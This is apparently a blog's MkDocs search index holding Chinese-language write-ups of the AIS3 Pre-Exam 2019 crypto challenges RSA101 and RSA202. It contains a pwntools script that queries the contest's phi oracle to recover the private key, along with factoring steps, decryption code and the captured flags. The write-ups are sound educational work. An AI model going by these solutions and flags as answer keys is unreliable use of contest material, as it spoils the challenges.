{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hello World \u7b2c\u4e00\u7bc7\u679c\u7136\u8981 Hello World \u4e00\u4e0b\u3002\u6253\u7b97\u5728\u9019\u908a\u6574\u7406\u5404\u7a2e\u5b78\u5230\u7684\u77e5\u8b58\u3002 \u81ea\u6211\u4ecb\u7d39 \u6709\u7a7a\u88dcwww","title":"Hello World"},{"location":"#hello-world","text":"\u7b2c\u4e00\u7bc7\u679c\u7136\u8981 Hello World \u4e00\u4e0b\u3002\u6253\u7b97\u5728\u9019\u908a\u6574\u7406\u5404\u7a2e\u5b78\u5230\u7684\u77e5\u8b58\u3002","title":"Hello World"},{"location":"#_1","text":"\u6709\u7a7a\u88dcwww","title":"\u81ea\u6211\u4ecb\u7d39"},{"location":"webStructure/","text":"\u7db2\u7ad9\u914d\u7f6e Static web server GitHub Pages Static site generator MKDocs Theme mkdocs-material Extensions KaTeX","title":"\u7db2\u7ad9\u914d\u7f6e"},{"location":"webStructure/#_1","text":"","title":"\u7db2\u7ad9\u914d\u7f6e"},{"location":"webStructure/#static-web-server","text":"GitHub Pages","title":"Static web server"},{"location":"webStructure/#static-site-generator","text":"MKDocs","title":"Static site generator"},{"location":"webStructure/#theme","text":"mkdocs-material","title":"Theme"},{"location":"webStructure/#extensions","text":"KaTeX","title":"Extensions"},{"location":"CTF/AIS3PreExam2019/","text":"Score","title":"Score"},{"location":"CTF/AIS3PreExam2019/#score","text":"","title":"Score"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/","text":"RSA101 Question 110001001100001011000100111100100100000011100100111001101100001 nc pre-exam-chals.ais3.org 10201 Write-up BTW\uff0c\u984c\u76ee\u90a3\u4e00\u4e32\u4e8c\u9032\u4f4d\u5b57\u4e32\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u4e4b\u5f8c\u662f baby rsa \u984c\u76ee\u7684\u5f62\u5f0f\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 Public-key (e,N) : (424079,9768327349257485556943054084344176106711916610576835499752968007980609416223394090306535400265138539636926258659464998256478923536612982708726953821848901028351768954522575475962236637711037649062884081925585642564066204562327798344747232827307750978884750039893871457039113882424045608239883750886353806918167496806759910183045077534918508775192283077897992978173068926779635191430439813974938327634093777781285981064397617049324817602780525340478334673472653614366650927820478484283553227460572966055658628741391093858211961680395317030550447107205587223224277429183265015058336402174786606743007721125693837328327) Encrypted Flag : 6498916130208542110171510158670981071096890450382717327181763083386652887050275800915366334810293100698589605347201426910277992051769372760930650560790200280713817833277900915211665096623483521889202251184809521615878533094847880974353284295454795481049807837859482061022350887596333236468520841094095433370316596598268499483365759944413171025478188325295595309720671542590961764131493870784934287977272269417934298106309289067323460563141006695972315638471466607777253627808541329136294048732963687708108336216763662712817499295573908157422088586273020010851630320923911790202258263087831260258675648677115455049488 PHI Oracle : n = ? 1 (n % phi) % 64 = 1 n = ? ... \u6703\u7d66\u6211\u5011 public key \u8ddf Encrypted Flag \uff0c\u6bcf\u6b21\u90fd\u4e0d\u4e00\u6a23 \u63a5\u4e0b\u4f86\u53ef\u4ee5\u4e0d\u65b7\u8f38\u5165 n \uff0c\u6703\u56de\u50b3 (n % phi) % 64 \u7684\u7d50\u679c \u76ee\u6a19\u5f88\u660e\u78ba\uff0c\u8981\u8b93\u6211\u5011\u627e\u51fa phi \u7136\u5f8c\u89e3\u78bc Encrypted Flag \u6709\u5617\u8a66\u904e\u53bb factordb \u627e\u7b54\u6848\uff0c\u6216\u662f\u7528yafu\u66b4\u529b\u89e3\uff0c\u56e0\u70ba N \u6709\u9ede\u9577\uff0c\u77ed\u6642\u9593\u89e3\u4e0d\u51fa\u4f86\u5c31\u653e\u68c4\u4e86\u3002 Step1 \u89c0\u5bdf (n % phi) % 64 \uff0c\u53ef\u4ee5\u767c\u73fe phi \u9060\u5927\u65bc 64 \uff0c\u56e0\u6b64\u5047\u8a2d n \u662f 64 \u7684\u500d\u6578\uff1a CASE1: \u5982\u679c n \u5c0f\u65bc phi \uff0c\u986f\u7136\u5730 (n % phi) % 64 = 0 CASE2: \u5982\u679c n \u6bd4 phi \u5927\u4e00\u4e9b\uff0c\u6b64\u6642 (n % phi) != 0 \uff0c\u6240\u4ee5 (n % phi) % 64 != 0 \u56e0\u6b64\u53ef\u4ee5\u4e0d\u65b7\u905e\u589e64\u7684\u500d\u6578\uff0c\u76f4\u5230\u56de\u50b3\u503c\u4e0d\u70ba0\uff0c\u85c9\u6b64\u627e\u5230 phi \u7684\u4e0a\u754c\u3002 1 2 3 4 5 6 7 8 # Step1 t = pow ( 10 , 600 ) # \u5df2\u77e5phi\u81f3\u5c11\u6709600\u4f4d\uff0c\u56e0\u6b64\u5f9epow(10, 600)\u958b\u59cb\u903c\u8fd1 ret = 0 # \u56de\u50b3\u503c while ret == 0 : t *= 10 # \u6bcf\u6b21\u4e5810\u903c\u8fd1\u4e0a\u754c sh . sendafter ( \"n = ?\" , str ( t * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) print ( \"Step1 Complete!\" ) Step2 \u6211\u4ee5\u6bcf\u6b21\u4e5810\u7684\u65b9\u5f0f\u903c\u8fd1\u4e0a\u754c\uff08\u4e5f\u5c31\u662f n = 64, 640, 6400, ... \uff09 \u56e0\u6b64\u82e5\u4e0a\u754c\u70ba 64 * b \uff0c\u6211\u53d6\u4e0b\u754c a = 64*b/10 \uff0c\u6709\u4e0a\u4e0b\u754c\u5c31\u53ef\u4ee5\u7528Binary Search\u5feb\u901f\u903c\u8fd1 phi \u3002 \u8209\u4f8b\u4f86\u8aaa\uff0c\u5982\u679c\u6e2c\u91cf\u5230\u7684\u4e0a\u754c\u70ba 6400 = 64 * 100 \uff0c\u4e0b\u754c\u53ef\u4ee5\u8a2d\u70ba 640 = 64 * 10 \uff0cBinary Search\u6642\u5c31\u53d6 64 * ((100+10)/2) = 64 * 55 = 3520 \uff0c\u5982\u679c\u56de\u50b3\u503c\u70ba 0 \uff0c\u66f4\u65b0\u4e0b\u754c\uff0c\u5426\u5247\u66f4\u65b0\u4e0a\u754c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 # Step2 a = int ( t ) / 10 # \u4e0b\u754c b = int ( t ) # \u4e0a\u754c while b - a != 1 : c = ( a + b ) // 2 # \u4e2d\u9ede sh . sendafter ( \"n = ?\" , str ( c * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) # \u56de\u50b3\u503c if ret == 0 : a = c # \u56de\u50b3\u503c\u70ba0 -> \u6bd4phi\u5c0f -> \u66f4\u65b0\u4e0b\u754c else : b = c # \u56de\u50b3\u503c\u4e0d\u70ba0 -> \u6bd4phi\u5927 -> \u66f4\u65b0\u4e0a\u754c print ( \"Step2 Complete!\" ) Step3 & Final Step Binary Search \u4e4b\u5f8c\u9084\u6c92\u5f97\u5230\u7b54\u6848\uff0c\u56e0\u70ba\u771f\u6b63\u7684 phi \u662f 64*a+1 ~ 64*b \u5176\u4e2d\u4e00\u500b\u3002 \u7d22\u6027\u628a\u6240\u6709\u6578\u5b57\u90fd\u7576\u4f5c phi \u8a08\u7b97\u51fa\u5c0d\u61c9\u7684 Plaintext \u7136\u5f8c\u5b58\u8d77\u4f86\uff0c\u56e0\u70ba\u6211\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u7684\u65b9\u6cd5\u6703\u5831\u932f\uff08\u53ef\u80fd\u662f\u9577\u5ea6\u4e0d\u7b26\u5427\uff0c\u61f6\u5f97\u8655\u7406\uff0c\u6c7a\u5b9a\u518d\u8dd1\u4e00\u6b21 Step1 ~ Step2 \uff0c\u5c07\u5169\u500b Plaintext \u7684\u96c6\u5408\u53d6\u4ea4\u96c6\u4e4b\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u771f\u6b63\u7684 Plaintext \u3002 \u6700\u5f8c\u628a\u5b83\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u5c31\u80fd\u5f97\u5230flag Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 # -*- coding: UTF-8 -*- #!/usr/bin/env python import math from pwn import * import re import binascii def egcd ( a , b ): # \u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6f14\u7b97\u6cd5 if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m def main (): ans1 = rsa () ans2 = rsa () ans3 = set ( ans1 ) & set ( ans2 ) print ( \"Finish!\" ) for a in ans3 : print ( binascii . unhexlify ( hex ( a )[ 2 :]) . decode ( 'utf-8' )) def rsa (): # Initialization host = \"pre-exam-chals.ais3.org\" port = 10201 sh = remote ( host , port ) r = sh . recvuntil ( \"PHI Oracle\" ) . split ( ' \\n ' ) e = int ( r [ 0 ] . split ( ':' )[ 1 ] . split ( ',' )[ 0 ] . split ( '(' )[ 1 ]) n = int ( r [ 0 ] . split ( ':' )[ 1 ] . split ( ',' )[ 1 ] . split ( ')' )[ 0 ]) cipher = int ( r [ 1 ] . split ( ' ' )[ - 1 ]) print ( \"Initialization Complete!\" ) # Step1 t = pow ( 10 , 600 ) # \u5df2\u77e5phi\u81f3\u5c11\u6709600\u4f4d\uff0c\u56e0\u6b64\u5f9epow(10, 600)\u958b\u59cb\u903c\u8fd1 ret = 0 # \u56de\u50b3\u503c while ret == 0 : t *= 10 # \u6bcf\u6b21\u4e5810\u903c\u8fd1\u4e0a\u754c sh . sendafter ( \"n = ?\" , str ( t * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) print ( \"Step1 Complete!\" ) # Step2 a = int ( t ) / 10 # \u4e0b\u754c b = int ( t ) # \u4e0a\u754c while b - a != 1 : c = ( a + b ) // 2 # \u4e2d\u9ede sh . sendafter ( \"n = ?\" , str ( c * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) # \u56de\u50b3\u503c if ret == 0 : a = c # \u56de\u50b3\u503c\u70ba0 -> \u6bd4phi\u5c0f -> \u66f4\u65b0\u4e0b\u754c else : b = c # \u56de\u50b3\u503c\u4e0d\u70ba0 -> \u6bd4phi\u5927 -> \u66f4\u65b0\u4e0a\u754c print ( \"Step2 Complete!\" ) # Step3 ans = [] for i in range ( 64 ): phi = a * 64 + ( i + 1 ) d = modinv ( e , phi ) plain = pow ( cipher , d , n ) ans . append ( plain ) print ( \"Step3 Complete!\" ) sh . close () return ans if __name__ == \"__main__\" : main () Flag AIS3{RSA_L0L_01100110011101010110001101101011} \u53ef\u4ee5\u8a66\u8457\u5c07flag\u4e2d\u7684\u4e8c\u9032\u4f4d\u8f49\u6210\u5b57\u4e32\u770b\u770bwww","title":"RSA101"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#rsa101","text":"","title":"RSA101"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#question","text":"110001001100001011000100111100100100000011100100111001101100001 nc pre-exam-chals.ais3.org 10201","title":"Question"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#write-up","text":"BTW\uff0c\u984c\u76ee\u90a3\u4e00\u4e32\u4e8c\u9032\u4f4d\u5b57\u4e32\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u4e4b\u5f8c\u662f baby rsa \u984c\u76ee\u7684\u5f62\u5f0f\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 Public-key (e,N) : (424079,9768327349257485556943054084344176106711916610576835499752968007980609416223394090306535400265138539636926258659464998256478923536612982708726953821848901028351768954522575475962236637711037649062884081925585642564066204562327798344747232827307750978884750039893871457039113882424045608239883750886353806918167496806759910183045077534918508775192283077897992978173068926779635191430439813974938327634093777781285981064397617049324817602780525340478334673472653614366650927820478484283553227460572966055658628741391093858211961680395317030550447107205587223224277429183265015058336402174786606743007721125693837328327) Encrypted Flag : 6498916130208542110171510158670981071096890450382717327181763083386652887050275800915366334810293100698589605347201426910277992051769372760930650560790200280713817833277900915211665096623483521889202251184809521615878533094847880974353284295454795481049807837859482061022350887596333236468520841094095433370316596598268499483365759944413171025478188325295595309720671542590961764131493870784934287977272269417934298106309289067323460563141006695972315638471466607777253627808541329136294048732963687708108336216763662712817499295573908157422088586273020010851630320923911790202258263087831260258675648677115455049488 PHI Oracle : n = ? 1 (n % phi) % 64 = 1 n = ? ... \u6703\u7d66\u6211\u5011 public key \u8ddf Encrypted Flag \uff0c\u6bcf\u6b21\u90fd\u4e0d\u4e00\u6a23 \u63a5\u4e0b\u4f86\u53ef\u4ee5\u4e0d\u65b7\u8f38\u5165 n \uff0c\u6703\u56de\u50b3 (n % phi) % 64 \u7684\u7d50\u679c \u76ee\u6a19\u5f88\u660e\u78ba\uff0c\u8981\u8b93\u6211\u5011\u627e\u51fa phi \u7136\u5f8c\u89e3\u78bc Encrypted Flag \u6709\u5617\u8a66\u904e\u53bb factordb \u627e\u7b54\u6848\uff0c\u6216\u662f\u7528yafu\u66b4\u529b\u89e3\uff0c\u56e0\u70ba N \u6709\u9ede\u9577\uff0c\u77ed\u6642\u9593\u89e3\u4e0d\u51fa\u4f86\u5c31\u653e\u68c4\u4e86\u3002","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#step1","text":"\u89c0\u5bdf (n % phi) % 64 \uff0c\u53ef\u4ee5\u767c\u73fe phi \u9060\u5927\u65bc 64 \uff0c\u56e0\u6b64\u5047\u8a2d n \u662f 64 \u7684\u500d\u6578\uff1a CASE1: \u5982\u679c n \u5c0f\u65bc phi \uff0c\u986f\u7136\u5730 (n % phi) % 64 = 0 CASE2: \u5982\u679c n \u6bd4 phi \u5927\u4e00\u4e9b\uff0c\u6b64\u6642 (n % phi) != 0 \uff0c\u6240\u4ee5 (n % phi) % 64 != 0 \u56e0\u6b64\u53ef\u4ee5\u4e0d\u65b7\u905e\u589e64\u7684\u500d\u6578\uff0c\u76f4\u5230\u56de\u50b3\u503c\u4e0d\u70ba0\uff0c\u85c9\u6b64\u627e\u5230 phi \u7684\u4e0a\u754c\u3002 1 2 3 4 5 6 7 8 # Step1 t = pow ( 10 , 600 ) # \u5df2\u77e5phi\u81f3\u5c11\u6709600\u4f4d\uff0c\u56e0\u6b64\u5f9epow(10, 600)\u958b\u59cb\u903c\u8fd1 ret = 0 # \u56de\u50b3\u503c while ret == 0 : t *= 10 # \u6bcf\u6b21\u4e5810\u903c\u8fd1\u4e0a\u754c sh . sendafter ( \"n = ?\" , str ( t * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) print ( \"Step1 Complete!\" )","title":"Step1"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#step2","text":"\u6211\u4ee5\u6bcf\u6b21\u4e5810\u7684\u65b9\u5f0f\u903c\u8fd1\u4e0a\u754c\uff08\u4e5f\u5c31\u662f n = 64, 640, 6400, ... \uff09 \u56e0\u6b64\u82e5\u4e0a\u754c\u70ba 64 * b \uff0c\u6211\u53d6\u4e0b\u754c a = 64*b/10 \uff0c\u6709\u4e0a\u4e0b\u754c\u5c31\u53ef\u4ee5\u7528Binary Search\u5feb\u901f\u903c\u8fd1 phi \u3002 \u8209\u4f8b\u4f86\u8aaa\uff0c\u5982\u679c\u6e2c\u91cf\u5230\u7684\u4e0a\u754c\u70ba 6400 = 64 * 100 \uff0c\u4e0b\u754c\u53ef\u4ee5\u8a2d\u70ba 640 = 64 * 10 \uff0cBinary Search\u6642\u5c31\u53d6 64 * ((100+10)/2) = 64 * 55 = 3520 \uff0c\u5982\u679c\u56de\u50b3\u503c\u70ba 0 \uff0c\u66f4\u65b0\u4e0b\u754c\uff0c\u5426\u5247\u66f4\u65b0\u4e0a\u754c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 # Step2 a = int ( t ) / 10 # \u4e0b\u754c b = int ( t ) # \u4e0a\u754c while b - a != 1 : c = ( a + b ) // 2 # \u4e2d\u9ede sh . sendafter ( \"n = ?\" , str ( c * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) # \u56de\u50b3\u503c if ret == 0 : a = c # \u56de\u50b3\u503c\u70ba0 -> \u6bd4phi\u5c0f -> \u66f4\u65b0\u4e0b\u754c else : b = c # \u56de\u50b3\u503c\u4e0d\u70ba0 -> \u6bd4phi\u5927 -> \u66f4\u65b0\u4e0a\u754c print ( \"Step2 Complete!\" )","title":"Step2"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#step3-final-step","text":"Binary Search \u4e4b\u5f8c\u9084\u6c92\u5f97\u5230\u7b54\u6848\uff0c\u56e0\u70ba\u771f\u6b63\u7684 phi \u662f 64*a+1 ~ 64*b \u5176\u4e2d\u4e00\u500b\u3002 \u7d22\u6027\u628a\u6240\u6709\u6578\u5b57\u90fd\u7576\u4f5c phi \u8a08\u7b97\u51fa\u5c0d\u61c9\u7684 Plaintext \u7136\u5f8c\u5b58\u8d77\u4f86\uff0c\u56e0\u70ba\u6211\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u7684\u65b9\u6cd5\u6703\u5831\u932f\uff08\u53ef\u80fd\u662f\u9577\u5ea6\u4e0d\u7b26\u5427\uff0c\u61f6\u5f97\u8655\u7406\uff0c\u6c7a\u5b9a\u518d\u8dd1\u4e00\u6b21 Step1 ~ Step2 \uff0c\u5c07\u5169\u500b Plaintext \u7684\u96c6\u5408\u53d6\u4ea4\u96c6\u4e4b\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u771f\u6b63\u7684 Plaintext \u3002 \u6700\u5f8c\u628a\u5b83\u8f49\u5341\u516d\u9032\u4f4d\u518d\u8f49\u5b57\u4e32\u5c31\u80fd\u5f97\u5230flag","title":"Step3 &amp; Final Step"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#code","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 # -*- coding: UTF-8 -*- #!/usr/bin/env python import math from pwn import * import re import binascii def egcd ( a , b ): # \u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6f14\u7b97\u6cd5 if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m def main (): ans1 = rsa () ans2 = rsa () ans3 = set ( ans1 ) & set ( ans2 ) print ( \"Finish!\" ) for a in ans3 : print ( binascii . unhexlify ( hex ( a )[ 2 :]) . decode ( 'utf-8' )) def rsa (): # Initialization host = \"pre-exam-chals.ais3.org\" port = 10201 sh = remote ( host , port ) r = sh . recvuntil ( \"PHI Oracle\" ) . split ( ' \\n ' ) e = int ( r [ 0 ] . split ( ':' )[ 1 ] . split ( ',' )[ 0 ] . split ( '(' )[ 1 ]) n = int ( r [ 0 ] . split ( ':' )[ 1 ] . split ( ',' )[ 1 ] . split ( ')' )[ 0 ]) cipher = int ( r [ 1 ] . split ( ' ' )[ - 1 ]) print ( \"Initialization Complete!\" ) # Step1 t = pow ( 10 , 600 ) # \u5df2\u77e5phi\u81f3\u5c11\u6709600\u4f4d\uff0c\u56e0\u6b64\u5f9epow(10, 600)\u958b\u59cb\u903c\u8fd1 ret = 0 # \u56de\u50b3\u503c while ret == 0 : t *= 10 # \u6bcf\u6b21\u4e5810\u903c\u8fd1\u4e0a\u754c sh . sendafter ( \"n = ?\" , str ( t * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) print ( \"Step1 Complete!\" ) # Step2 a = int ( t ) / 10 # \u4e0b\u754c b = int ( t ) # \u4e0a\u754c while b - a != 1 : c = ( a + b ) // 2 # \u4e2d\u9ede sh . sendafter ( \"n = ?\" , str ( c * 64 )) ret = int ( sh . recvlines ( 2 )[ - 1 ] . split ( ' ' )[ 6 ]) # \u56de\u50b3\u503c if ret == 0 : a = c # \u56de\u50b3\u503c\u70ba0 -> \u6bd4phi\u5c0f -> \u66f4\u65b0\u4e0b\u754c else : b = c # \u56de\u50b3\u503c\u4e0d\u70ba0 -> \u6bd4phi\u5927 -> \u66f4\u65b0\u4e0a\u754c print ( \"Step2 Complete!\" ) # Step3 ans = [] for i in range ( 64 ): phi = a * 64 + ( i + 1 ) d = modinv ( e , phi ) plain = pow ( cipher , d , n ) ans . append ( plain ) print ( \"Step3 Complete!\" ) sh . close () return ans if __name__ == \"__main__\" : main ()","title":"Code"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA101/#flag","text":"AIS3{RSA_L0L_01100110011101010110001101101011} \u53ef\u4ee5\u8a66\u8457\u5c07flag\u4e2d\u7684\u4e8c\u9032\u4f4d\u8f49\u6210\u5b57\u4e32\u770b\u770bwww","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA202/","text":"RSA202 Question \u6c92\u5099\u4efd\u5230QQ Write-up \u984c\u76ee\u5927\u6982\u9577\u9019\u6a23\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Preparing your challenge ... Ok! e : 818951293 n1 : r * next_prime(r) 3319807826271771260791522140712557919872200771602527593321989461578898751543543609587312777725321369840399209569462462165534920505893592659672068701281163631996087556482216224798157 n2 : p * qenc : pow(FLAG1, e, n1) 2559703675711675047641071897946512575045532380328023256372842294655693780455749555749828609243490139742616717743329848750299479365470208614651966957866230875068231128624272844531117 enc : pow(FLAG2, e, n2) 2493630939697299197277919265812017114442127807917541085789008502858549778741149238882882873294039622636750805078758876031386334550302422994742013690549188247343771941207014405570023313757918550493865350757675812056152640413198399204316508784595519459868685957390482138312680115492263218084478856750181747506773067911216985383201376089512563030858185619338551712528055000025968318485733959855422249170106971243201078523082783604162404432833084755410475743620241657139662498766657007564056856359190711293603696357850003788930143354000283270316248287104924396730347396340829280661931487032693728105946773984015003336829031894620838750813430040931702859318556833078572448281175545641120091731415356777873759790622589555109378 p,q,r are prime numbers. ((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0 Good luck !!% \u5df2\u77e5\u6578\u6709\uff1a e , n1 , n2 , enc1 , enc2 \u9996\u5148\u89c0\u5bdf\u5b83\u5011\u7684\u9577\u5ea6\uff1a e \u633a\u6b63\u5e38\u7684\u9577\u5ea6 n1 \u7d04\u70ba180\u4f4d\u6578 n2 \u7d04\u70ba720\u4f4d\u6578 n1 \u7684\u9577\u5ea6\u6709\u9ede\u77ed\uff0c\u56e0\u6b64\u7528yafu\u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u6210\u529f\u5206\u89e3\u5f97\u5230 r , next_prime(r) \uff1a 1 2 r = 1822033980548049839468735790034731089408207187998249893982762819316163642808029381911635869 next_prime(r) = 1822033980548049839468735790034731089408207187998249893982762819316163642808029381911635953 \u518d\u4f86\u8655\u7406 n2 \uff0c\u770b\u5230\u5927\u4f4d\u6578\u9996\u5148\u4e1f\u5230 factorDB \u4e2d\uff0c\u62bd\u4e2d\u5c31\u7d50\u675f\u4e86\u3002 \u770b\u4f86\u4e26\u6c92\u6709\u90a3\u9ebc\u597d\u7684\u4e8b\u60c5\uff0c\u53ea\u597d\u9762\u5c0d\u984c\u76ee\u7d66\u7684\u95dc\u4fc2\u5f0f\uff08$\\%$\u70ba\u6a21\u904b\u7b97\uff09\uff1a $$ ((p-1)\\%r)^2+((r^5-1)\\%p)^2=0 $$ \u9996\u5148\u56e0\u70ba\u9918\u6578\u5fc5\u5b9a\u5927\u65bc\u7b49\u65bc 0 \uff0c\u6240\u4ee5\u6709\uff1a $$ (p-1)\\equiv0\\pmod{r} $$ $$ (r^5-1)\\equiv0\\pmod{p} $$ 1$^o$ \u8003\u616e\u5f0f1\uff1a \u53ef\u4ee5\u77e5\u9053$\\ p>r$ 2$^o$ \u8003\u616e\u5f0f2\uff1a $$ (r-1)(r^4+r^3+r^2+r^1+1)=(r^5-1)\\equiv0\\pmod{p} $$ $$ \\Rightarrow(r-1)\\equiv0\\pmod{p}\\lor(r^4+r^3+r^2+r^1+1)\\equiv0\\pmod{p} $$ \u6839\u64da 1$^o$ \uff0c$(r-1)\\equiv0\\pmod{p}\\ $\u4e0d\u6210\u7acb\uff0c\u56e0\u6b64$(r^4+r^3+r^2+r^1+1)\\equiv0\\pmod{p}\\ $\u5fc5\u7136\u6210\u7acb \u4e0d\u59a8\u5047\u8a2d$\\ (r^4+r^3+r^2+r^1+1)={k}\\times{p}$ \u8a08\u7b97$R=r^4+r^3+r^2+r^1+1$\uff0c\u70ba\u4e00\u500b362\u4f4d\u6578\u3002\u628a\u5b83\u62ff\u53bb\u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u767c\u73fe\u662f\u500b\u8cea\u6578\u3002 \u4e5f\u5c31\u662f\u8aaa$\\ k=1\\ $\u4e14$\\ p=R\\ $\u3002 \u5f97\u5230$\\ p\\ $\uff0c\u6240\u4ee5$\\ q=n_2/p\\ $\uff0c\u9700\u8981\u7684\u6578\u5b57\u90fd\u5f97\u5230\u4e86\u3002 \u63a5\u4e0b\u4f86\u662f\u958b\u5fc3\u7684RSA\u89e3\u78bc\u6642\u9593\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def egcd ( a , b ): # \u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6f14\u7b97\u6cd5 if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m phi = ( p - 1 ) * ( q - 1 ) d = modinv ( e , phi ) plain = pow ( enc , d , n ) print ( binascii . unhexlify ( hex ( plain )[ 2 :]) . decode ( 'utf-8' )) \u628a enc1 , enc2 \u89e3\u78bc\u4e4b\u5f8c\u5408\u4f75\u5c31\u5f97\u5230flag\u4e86 Flag AIS3{S0me7im3s_I_h4tE_factorDB} \u628a\u5169\u767e\u591a\u7d44n2\u4e1f\u5230factordb\u90fd\u6c92\u4e2dQQ","title":"RSA202"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA202/#rsa202","text":"","title":"RSA202"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA202/#question","text":"\u6c92\u5099\u4efd\u5230QQ","title":"Question"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA202/#write-up","text":"\u984c\u76ee\u5927\u6982\u9577\u9019\u6a23\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Preparing your challenge ... Ok! e : 818951293 n1 : r * next_prime(r) 3319807826271771260791522140712557919872200771602527593321989461578898751543543609587312777725321369840399209569462462165534920505893592659672068701281163631996087556482216224798157 n2 : p * qenc : pow(FLAG1, e, n1) 2559703675711675047641071897946512575045532380328023256372842294655693780455749555749828609243490139742616717743329848750299479365470208614651966957866230875068231128624272844531117 enc : pow(FLAG2, e, n2) 2493630939697299197277919265812017114442127807917541085789008502858549778741149238882882873294039622636750805078758876031386334550302422994742013690549188247343771941207014405570023313757918550493865350757675812056152640413198399204316508784595519459868685957390482138312680115492263218084478856750181747506773067911216985383201376089512563030858185619338551712528055000025968318485733959855422249170106971243201078523082783604162404432833084755410475743620241657139662498766657007564056856359190711293603696357850003788930143354000283270316248287104924396730347396340829280661931487032693728105946773984015003336829031894620838750813430040931702859318556833078572448281175545641120091731415356777873759790622589555109378 p,q,r are prime numbers. ((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0 Good luck !!% \u5df2\u77e5\u6578\u6709\uff1a e , n1 , n2 , enc1 , enc2 \u9996\u5148\u89c0\u5bdf\u5b83\u5011\u7684\u9577\u5ea6\uff1a e \u633a\u6b63\u5e38\u7684\u9577\u5ea6 n1 \u7d04\u70ba180\u4f4d\u6578 n2 \u7d04\u70ba720\u4f4d\u6578 n1 \u7684\u9577\u5ea6\u6709\u9ede\u77ed\uff0c\u56e0\u6b64\u7528yafu\u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u6210\u529f\u5206\u89e3\u5f97\u5230 r , next_prime(r) \uff1a 1 2 r = 1822033980548049839468735790034731089408207187998249893982762819316163642808029381911635869 next_prime(r) = 1822033980548049839468735790034731089408207187998249893982762819316163642808029381911635953 \u518d\u4f86\u8655\u7406 n2 \uff0c\u770b\u5230\u5927\u4f4d\u6578\u9996\u5148\u4e1f\u5230 factorDB \u4e2d\uff0c\u62bd\u4e2d\u5c31\u7d50\u675f\u4e86\u3002 \u770b\u4f86\u4e26\u6c92\u6709\u90a3\u9ebc\u597d\u7684\u4e8b\u60c5\uff0c\u53ea\u597d\u9762\u5c0d\u984c\u76ee\u7d66\u7684\u95dc\u4fc2\u5f0f\uff08$\\%$\u70ba\u6a21\u904b\u7b97\uff09\uff1a $$ ((p-1)\\%r)^2+((r^5-1)\\%p)^2=0 $$ 